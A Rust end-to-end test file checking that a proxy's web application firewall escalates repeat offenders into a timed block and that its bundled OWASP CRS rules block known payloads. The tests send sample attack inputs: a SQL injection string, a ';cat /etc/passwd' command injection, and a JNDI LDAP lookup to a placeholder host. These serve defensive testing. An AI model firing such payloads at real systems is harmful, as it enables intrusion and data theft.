//! End-to-end coverage for WAF persistent (time-boxed) block actions
//! and the shipped OWASP CRS managed bundle.
//!
//! Persistent blocking auto-escalates a client that trips the WAF
//! repeatedly into a time-boxed block. After the strike threshold is
//! crossed, every subsequent request from that client is rejected up
//! front, even a benign one, until the block window lifts. The state is
//! backed by the existing rate-limit store (in-process here, shared Redis
//! in a cluster) so it survives across requests.
//!
//! The block-state machine, threshold/escalation/release logic, and the
//! cross-replica (shared-store) path are unit-tested in
//! `crates/sbproxy-modules/src/policy/waf/persistent.rs`. The release leg
//! uses a 1-minute minimum window, too long to wait on in an e2e run, so
//! the timed release is pinned by the unit tests (which advance a fake
//! clock); this file pins the trip-N-times-then-blocked loop and the
//! metric/audit observability end to end.
//!
//! The managed-bundle case proves the shipped OWASP CRS corpus enables
//! with one flag (`owasp_crs.managed_bundle: true`) and blocks a known
//! CRS-flagged payload at a selectable paranoia level.

use sbproxy_e2e::ProxyHarness;

/// WAF config with persistent blocking enabled. Two strikes inside the
/// window escalate the client to a time-boxed block.
fn persistent_block_config() -> String {
    r#"
proxy:
  http_bind_port: 0
origins:
  "waf.localhost":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: "ok"
    policies:
      - type: waf
        owasp_crs:
          enabled: true
        action_on_match: block
        fail_open: false
        persistent_block:
          enabled: true
          strikes: 2
          window_secs: 60
          block_minutes: 5
          track_by: ip
"#
    .to_string()
}

/// WAF config enabling the shipped OWASP CRS managed bundle with one flag
/// at a selectable paranoia level.
fn managed_bundle_config(paranoia: u8) -> String {
    format!(
        r#"
proxy:
  http_bind_port: 0
origins:
  "crs.localhost":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: "ok"
    policies:
      - type: waf
        owasp_crs:
          managed_bundle: true
          paranoia_level: {paranoia}
        action_on_match: block
        fail_open: false
"#,
        paranoia = paranoia,
    )
}

/// Fetch the `/metrics` exposition text from the data-plane port.
fn fetch_metrics(harness: &ProxyHarness) -> String {
    let resp = harness.get("/metrics", "waf.localhost").expect("metrics");
    assert_eq!(resp.status, 200);
    resp.text().unwrap_or_default()
}

// --- Persistent block: trip N times, then blocked ---

#[test]
fn client_is_blocked_after_tripping_waf_threshold_times() {
    let harness = ProxyHarness::start_with_yaml(&persistent_block_config()).expect("start proxy");

    // A benign request passes before any strikes.
    let benign = harness
        .get("/healthz?ok=1", "waf.localhost")
        .expect("benign GET");
    assert_eq!(benign.status, 200, "benign request must pass initially");

    // SQLi payload trips the WAF. strikes=2, so the first two denials are
    // WAF blocks; the second crosses the threshold and escalates.
    let sqli = "/get?id=1%27%20OR%20%271%27=%271";
    let r1 = harness.get(sqli, "waf.localhost").expect("strike 1");
    assert_eq!(r1.status, 403, "first SQLi must be blocked by the WAF");
    let r2 = harness.get(sqli, "waf.localhost").expect("strike 2");
    assert_eq!(r2.status, 403, "second SQLi must be blocked by the WAF");

    // The client is now inside the time-boxed block window: even a benign
    // request is rejected up front until the block lifts.
    let after = harness
        .get("/healthz?ok=1", "waf.localhost")
        .expect("benign GET after block");
    assert_eq!(
        after.status, 403,
        "benign request must be blocked while the client is in a persistent block; got {}",
        after.status
    );
}

// --- Persistent block: observable in metrics ---

#[test]
fn persistent_block_actions_emit_metrics() {
    let harness = ProxyHarness::start_with_yaml(&persistent_block_config()).expect("start proxy");

    let sqli = "/get?id=1%27%20OR%20%271%27=%271";
    // Trip the WAF twice to escalate, then hit it once more while blocked.
    for _ in 0..2 {
        let _ = harness.get(sqli, "waf.localhost").expect("strike");
    }
    let _ = harness
        .get("/healthz?ok=1", "waf.localhost")
        .expect("blocked benign");

    let metrics = fetch_metrics(&harness);
    assert!(
        metrics.contains("sbproxy_waf_persistent_blocks_total"),
        "persistent-block metric series must be present in /metrics"
    );
    assert!(
        metrics.contains(r#"event="escalated""#),
        "an escalation event must be recorded; metrics:\n{}",
        metrics
            .lines()
            .filter(|l| l.contains("waf_persistent"))
            .collect::<Vec<_>>()
            .join("\n")
    );
    assert!(
        metrics.contains(r#"event="blocked""#),
        "a blocked-while-in-window event must be recorded"
    );
}

// --- Shipped OWASP CRS managed bundle: one flag blocks a known payload ---

#[test]
fn managed_bundle_blocks_known_crs_payload_with_one_flag() {
    let harness = ProxyHarness::start_with_yaml(&managed_bundle_config(1)).expect("start proxy");

    // Benign request passes.
    let benign = harness.get("/page?ok=1", "crs.localhost").expect("benign");
    assert_eq!(benign.status, 200, "benign request must pass");

    // `; cat /etc/passwd` matches the crs-932-100 RCE signature (paranoia=1).
    let resp = harness
        .get("/run?cmd=;cat%20/etc/passwd", "crs.localhost")
        .expect("CRS RCE payload");
    assert_eq!(
        resp.status,
        403,
        "managed bundle must block a known CRS payload with one flag; got {} body={:?}",
        resp.status,
        resp.text().ok()
    );
}

#[test]
fn managed_bundle_paranoia_level_gates_strict_rules() {
    // crs-944-100 (jndi lookup) is paranoia=2.
    let payload = "/lookup?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D";

    // paranoia=1: the strict rule is skipped, request passes.
    let low = ProxyHarness::start_with_yaml(&managed_bundle_config(1)).expect("start proxy");
    let resp = low.get(payload, "crs.localhost").expect("low paranoia");
    assert_eq!(
        resp.status, 200,
        "paranoia=1 must skip the strict CRS bundle rule; got {}",
        resp.status
    );

    // paranoia=2: the strict rule fires, request blocked.
    let high = ProxyHarness::start_with_yaml(&managed_bundle_config(2)).expect("start proxy");
    let resp = high.get(payload, "crs.localhost").expect("high paranoia");
    assert_eq!(
        resp.status, 403,
        "paranoia=2 must run the strict CRS bundle rule; got {}",
        resp.status
    );
}
